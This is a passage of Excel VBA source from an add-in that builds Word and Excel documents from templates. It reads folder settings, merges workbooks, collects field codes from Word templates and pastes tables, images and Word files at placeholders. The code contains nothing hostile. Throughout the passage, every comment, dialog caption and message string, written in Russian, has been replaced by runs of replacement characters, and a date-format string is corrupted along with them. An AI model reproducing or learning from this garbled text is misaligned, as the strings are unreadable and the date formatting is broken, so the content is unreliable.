        If ForTextbox Then TEMPLATES_FOLDER$ = "<|fffd||fffd||fffd||fffd||fffd|, |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel>\|fffd||fffd||fffd||fffd||fffd||fffd||fffd|\"
        Err.Clear: Exit Function
    End If

    TEMPLATES_FOLDER$ = SETT.GetText("TextBox_TemplatesFolder")
    If Dir(TEMPLATES_FOLDER$, vbDirectory) = "" Then MkDir TEMPLATES_FOLDER$
End Function

Function IMAGES_FOLDER$()
    IMAGES_FOLDER$ = SETT.GetText("TextBox_ImagesFolder")
End Function
Function WORDDOC_FOLDER$()
    WORDDOC_FOLDER$ = SETT.GetText("TextBox_WordDocFolder")
End Function

Function USE_CURRENT_FOLDER() As Boolean
    On Error Resume Next: Dim en&: en& = Err.Number
    USE_CURRENT_FOLDER = SETT.GetBoolean("CheckBox_UseCurrentFolder")
    If en& = 0 Then Err.Clear
End Function

Function PRINT_TO_PDF() As Boolean
    PRINT_TO_PDF = SETT.GetBoolean("CheckBox_PDF")
End Function

Function IMMEDIATE_PRINTOUT() As Boolean
    On Error Resume Next: Dim en&: en& = Err.Number
    IMMEDIATE_PRINTOUT = SETT.GetBoolean("CheckBox_ImmediatePrintOut", False)
    If en& = 0 Then Err.Clear
End Function

Function HEADER_ROW() As Long
    On Error Resume Next
    HEADER_ROW = SETT.GetNumber("ComboBox_FirstRow")
    If HEADER_ROW = 0 Then HEADER_ROW = 1
End Function

Function FullDate(ByVal d As Date) As String
    Application.Volatile True
    FullDate = Format(d, "|fffd|DD|fffd| mmmm yyyy |fffd||fffd||fffd||fffd|")
End Function

Function LineFeedOptions()
    On Error Resume Next
    ReDim arr(1 To 5, 1 To 2)
    arr(1, 1) = " ": arr(1, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(2, 1) = Chr(13): arr(2, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(3, 1) = Chr(11): arr(3, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(4, 1) = Chr(31): arr(4, 2) = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
    arr(5, 1) = "del": arr(5, 2) = "<|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|>"
    LineFeedOptions = arr
End Function


Function CombineXLSsheets(ByRef coll As Collection) As String
    On Error Resume Next: Err.Clear
    Dim NewFilename$, File_Format&

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    NewFilename$ = Replace_symbols(SETT.GetText("TextBox_CombineXLS_filename"))
    If Not NewFilename$ Like "*.xls*" Then NewFilename$ = NewFilename$ & IIf(Val(Application.Version) >= 12, ".xlsx", ".xls")
    NewFilename$ = OUTPUT_FOLDER$ & NewFilename$

    If coll.Count = 1 Then        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
        Name coll(1) As NewFilename$
        Exit Function
    End If

    Dim WB As Workbook, commonWB As Workbook, sh As Worksheet, filename, fname$, shname$
    Set commonWB = Application.Workbooks.Add(xlWBATWorksheet)
    For Each filename In coll
        fname$ = Dir(filename, vbNormal)
        If Len(fname$) > 0 And (fname$ Like "*?.xls*") Then
            shname$ = Left(fname$, InStrRev(fname$, ".") - 1)
            Set WB = Workbooks.Open(filename, False, True)
            If Not WB Is Nothing Then
                '  For Each sh In WB.Worksheets : : Next sh
                ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|
                Err.Clear: WB.Worksheets(1).Copy , commonWB.Worksheets(commonWB.Worksheets.Count)
                If Err = 0 Then        ' |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    Set sh = commonWB.Worksheets(commonWB.Worksheets.Count)
                    sh.Name = Left(fname$, 31)
                End If
                WB.Close False
            End If
        End If
    Next
    If commonWB.Worksheets.Count > 1 Then
        Application.DisplayAlerts = False
        commonWB.Worksheets(1).Delete

        File_Format = GetFileFormatForNewFile(NewFilename$)
        If Len(File_Format) Then
            commonWB.SaveAs NewFilename$, Val(File_Format)
        Else
            commonWB.SaveAs NewFilename$
        End If
        commonWB.Close False

        If SETT.GetBoolean("CheckBox_CombineXLS_DeleteSourceFiles") Then
            For Each filename In coll
                Kill filename
            Next
        End If

        Application.DisplayAlerts = True
        CombineXLSsheets = NewFilename$
    Else
        commonWB.Close False
    End If
End Function


' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

Sub AddAbsentFieldCodes()
    On Error Resume Next
    Dim TemplatesFilenames As Collection, filename As Variant
    Set TemplatesFilenames = FilenamesCollection(TEMPLATES_FOLDER$)

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Set SelectedTemplates = TemplatesFilenames
    With F_Templates
        .Caption = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
        .CommandButton_Run.Caption = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        .Label_Info.Caption = "|fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| Word"
        .Label_Info.Tag = "-"
        .Show
    End With
    If SelectedTemplates.Count = 0 Then Exit Sub
    Set TemplatesFilenames = SelectedTemplates

    Dim NeedWord As Boolean, WordAlreadyOpen As Boolean, msg$
    For Each filename In TemplatesFilenames
        NeedWord = NeedWord Or (TemplateType(filename) Like "DOC*")
    Next
    If Not NeedWord Then Exit Sub

    If NeedWord Then
        Set WA = GetObject(, "Word.Application")
        If WA Is Nothing Then Set WA = CreateObject("Word.Application") Else WordAlreadyOpen = True
        If WA Is Nothing Then
            msg$ = "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Microsoft Word," & vbNewLine & _
                   "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & _
                   "(|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, Microsoft Word |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)"
            MsgBox msg$, vbCritical, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Microsoft Word"
            Exit Sub
        End If
        WA.Visible = False
    End If

    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Dim coll As New Collection, code, cnt_templates&
    For Each filename In TemplatesFilenames
        If TemplateType(filename) Like "DOC*" Then cnt_templates& = cnt_templates& + 1: LoadFieldCodes_DOC filename, coll
    Next

    If Not WordAlreadyOpen Then
        WA.Quit        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Word, |fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
    Else
        WA.Visible = True
    End If
    Set WA = Nothing
    AppActivate Application.Name

    If coll.Count = 0 Then MsgBox "|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|", vbExclamation: Exit Sub

    Dim cell As Range, cnt_found&, cnt_new&, cnt_exist&

    cnt_found& = coll.Count
    For Each cell In SpecialCells_TypeConstants(Rows(HEADER_ROW)).Cells
        coll.Remove LCase$(CStr(cell.Text))
        If Not cell Is Nothing Then cnt_exist& = cnt_exist& + 1
    Next
    cnt_new& = coll.Count

    If coll.Count = 0 Then MsgBox "|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| (" & cnt_found& & ") |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation: Exit Sub

    If ActiveSheet Is Nothing Then Workbooks.Add xlWBATWorksheet
    For Each code In coll
        Set cell = Cells(HEADER_ROW, Columns.Count).End(xlToLeft)
        If cell <> "" Then Set cell = cell.Next
        cell.Value = code
    Next

    msg$ = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & cnt_templates& & " |fffd||fffd| " & TemplatesFilenames.Count & vbNewLine & vbNewLine & _
           "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & cnt_found& & ", |fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & cnt_new& & vbNewLine & _
         " (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & cnt_exist& & ")" & vbNewLine & vbNewLine & _
           "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|: " & cnt_new&
    MsgBox msg, vbInformation, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|."
End Sub

Attribute VB_Name = "mod_InsertObjects"
'---------------------------------------------------------------------------------------
' Module        : mod_InsertObjects
' Author        : |fffd||fffd||fffd||fffd||fffd|                     Date: 07.07.2013
' Professional application development for Microsoft Excel
' http://ExcelVBA.ru/          ICQ: 5836318           Skype: ExcelVBA.ru
'---------------------------------------------------------------------------------------

Option Explicit
Option Compare Text
Option Private Module

Public Const LINK_HEADER_TABLE$ = "<ExcelTable>", COLUMN_MARK_IMAGE$ = "PasteImage", COLUMN_MARK_WORDDOC$ = "PasteWordDoc"
Public CellWithLink As Range, ExcelTablesToBeClosed As New Collection

Sub CtrlShiftT(): InsertOrEditTableLink: End Sub

Sub CtrlShiftI()
    On Error Resume Next
    If ActiveSheet Is Nothing Then Exit Sub
    Dim filename$

    If Not FolderExists(IMAGES_FOLDER$) Then
        MsgBox "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|) |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| " & vbNewLine & _
               "|fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
        With F_Settings
            .Show
            .MultiPage_Options.Value = 4
            .MultiPage_Options.Pages(4).ScrollTop = .Label_OpenImagesFolder.Top - 10
            .TextBox_ImagesFolder.BackColor = vbRed
            .CommandButton_ChangeImagesFolder.SetFocus
        End With
        Exit Sub
    End If

    filename$ = GetFilePath("|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", IMAGES_FOLDER$, "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|", "*.*")
    If filename$ = "" Then Exit Sub

    ActiveCell = Dir(filename$, vbNormal)
End Sub


Sub InsertOrEditTableLink()
    On Error Resume Next
    Set CellWithLink = Nothing: Set CellWithLink = ActiveCell
    If CellWithLink Is Nothing Then Exit Sub
    F_SelectTable.Show
End Sub

Function HasLinkToObject(ByVal txt$, Optional ByVal key$) As Boolean
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| TRUE, |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| txt$ |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
    HasLinkToObject = (txt$ Like LINK_HEADER_TABLE$ & "*/*/*") Or _
                      (key$ Like "*" & COLUMN_MARK_IMAGE$ & "*") Or (key$ Like "*" & COLUMN_MARK_WORDDOC$ & "*")
End Function

Sub InsertObjectIntoDOC(ByRef doc As Object, ByVal txt$, ByVal key$, Optional ByRef pi As ProgressIndicator)
    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| txt$, |fffd| Word-|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| doc |fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| key$
    On Error Resume Next
    Dim msg$, InsertMode$, filename$, myStoryRange As Object

    Select Case True

        Case txt$ Like LINK_HEADER_TABLE$ & "*/*/*"        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|

            If Not CopyExcelTable(txt$, msg$, InsertMode$) Then
                msg$ = "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|" & vbNewLine & txt & vbNewLine & vbNewLine & msg$
                MsgBox msg$, vbExclamation, "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd|"
                Exit Sub
            End If

            doc.Range.Select
            With doc.Parent.Selection.Find
                .Text = key$
                While .Execute
                    Select Case InsertMode$
                        Case "Excel", ""
                            doc.Parent.Selection.PasteExcelTable False, False, False        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                        Case "Word"
                            doc.Parent.Selection.PasteExcelTable False, True, False        ' |fffd||fffd||fffd||fffd||fffd| Word
                        Case "PlainText"
                            doc.Parent.Selection.PasteAndFormat 22        ' (wdFormatPlainText) ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                        Case "Picture"
                            doc.Parent.Selection.PasteAndFormat 13        '(wdChartPicture) ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|
                    End Select
                Wend
            End With
            Application.CutCopyMode = False


        Case key$ Like "*" & COLUMN_MARK_WORDDOC$ & "*"        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Word

            If Not FolderExists(WORDDOC_FOLDER$) Then
                pi.Parent.Log "|fffd||fffd||fffd||fffd||fffd||fffd|: " & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Word"
                Exit Sub
            End If

            If InStr(1, txt, ".") = 0 Then        ' |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                filename$ = "": filename$ = Dir(WORDDOC_FOLDER$ & Trim(txt) & ".*", vbNormal)
                If Len(filename$) Then txt = filename$
            End If

            If txt Like "*?*.*?*" Then        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                filename$ = WORDDOC_FOLDER$ & Trim(txt)
                If FileExists(filename$) Then

                    Dim sourceWD As Object        ', DocText As Variant
                    Set sourceWD = doc.Parent.Documents.Open(filename$, , False, False)
                    sourceWD.Range.Copy
                    sourceWD.Close False

                    For Each myStoryRange In doc.StoryRanges
                        DoEvents
                        With myStoryRange
                            .Select
                            With doc.Parent.Selection.Find
                                .Text = key$
                                While .Execute
                                    doc.Parent.Selection.PasteAndFormat 0        ' wdPasteDefault,  |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|  16 'wdFormatOriginalFormatting
                                Wend
                            End With
                        End With

                        While Not (myStoryRange.NextStoryRange Is Nothing)
                            Set myStoryRange = myStoryRange.NextStoryRange
                            With myStoryRange
                                .Select
                                With doc.Parent.Selection.Find
                                    .Text = key$
                                    While .Execute
                                        doc.Parent.Selection.PasteAndFormat 0        ' wdPasteDefault,  |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|  16 'wdFormatOriginalFormatting
                                    Wend
                                End With
                            End With
                        Wend
                    Next myStoryRange

                Else
                    pi.Parent.Log "|fffd||fffd||fffd||fffd||fffd||fffd|: " & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|  Word |fffd|" & txt & "|fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                End If
            Else        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                pi.Parent.Log "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|)  |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Word |fffd|" & txt & "|fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            End If


        Case key$ Like "*" & COLUMN_MARK_IMAGE$ & "*"        ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|

            Dim sizeW&, sizeH&, IShape As Object
            If txt Like "*|*" Then
                ' |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| | |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, IMG_3515.JPG|1200|1500
                ' |fffd||fffd||fffd| 1200 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|, |fffd| 1500 - |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| (|fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|)
                sizeW& = Val(Split(txt, "|")(1))
                sizeH& = Val(Split(txt, "|")(2))
                txt = Split(txt, "|")(0)
            End If

            If txt Like "*?*.*?*" Then        ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|
                If txt Like "[A-Z]:\?*.?*" Then
                    ' |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd|
                    filename$ = Trim(txt)
                Else
                    If Not FolderExists(IMAGES_FOLDER$) Then
                        pi.Parent.Log "|fffd||fffd||fffd||fffd||fffd||fffd|: " & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|, |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                        Exit Sub
                    End If
                    filename$ = IMAGES_FOLDER$ & Trim(txt)
                End If

                If FileExists(filename$) Then
                    pi.Parent.Log "|fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Word: " & Dir(filename$, vbNormal)

                    ' |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd| Word
                    For Each myStoryRange In doc.StoryRanges
                        DoEvents
                        With myStoryRange
                            .Select
                            With doc.Parent.Selection.Find
                                .Text = key$
                                While .Execute
                                    Set IShape = Nothing: Set IShape = doc.Parent.Selection.InlineShapes.AddPicture(filename$, False, True)
                                    If sizeW& + sizeH& > 0 Then
                                        If Not IShape Is Nothing Then ResizeInlineShape IShape, sizeW&, sizeH&
                                    End If
                                Wend
                            End With
                        End With

                        While Not (myStoryRange.NextStoryRange Is Nothing)
                            Set myStoryRange = myStoryRange.NextStoryRange
                            With myStoryRange
                                .Select
                                With doc.Parent.Selection.Find
                                    .Text = key$
                                    While .Execute
                                        Set IShape = Nothing: Set IShape = doc.Parent.Selection.InlineShapes.AddPicture(filename$, False, True)
                                        If sizeW& + sizeH& > 0 Then
                                            If Not IShape Is Nothing Then ResizeInlineShape IShape, sizeW&, sizeH&
                                        End If
                                    Wend
                                End With
                            End With
                        Wend
                    Next myStoryRange

                Else
                    pi.Parent.Log "|fffd||fffd||fffd||fffd||fffd||fffd|: " & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd|  |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd|" & txt & "|fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
                End If
            Else        ' |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd|
                pi.Parent.Log "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|: " & "|fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd|"
            End If
    End Select
End Sub

Sub ResizeInlineShape(ByRef IShape As Object, ByVal sizeW&, ByVal sizeH&)
    On Error Resume Next
    If sizeW& = 0 And sizeH& = 0 Then Exit Sub
    If sizeW& < 0 Or sizeH& < 0 Then Exit Sub
    With IShape
        .LockAspectRatio = True
        Select Case True
            Case sizeW& > 0 And sizeH& > 0
                .Width = sizeW&
                If .Height > sizeH& Then .Height = sizeH&
            Case sizeH& > 0
                .Height = sizeH&
            Case sizeW& > 0
                .Width = sizeW&
        End Select
    End With
    Err.Clear
End Sub

Function InsertTableStylesArray() As Variant
    ReDim arr(0 To 3, 0 To 1)
    arr(0, 0) = "Excel": arr(0, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| Excel"
    arr(1, 0) = "Word": arr(1, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd| Word"
    arr(2, 0) = "PlainText": arr(2, 1) = "|fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd||fffd||fffd||fffd| |fffd||fffd||fffd||fffd||fffd|"
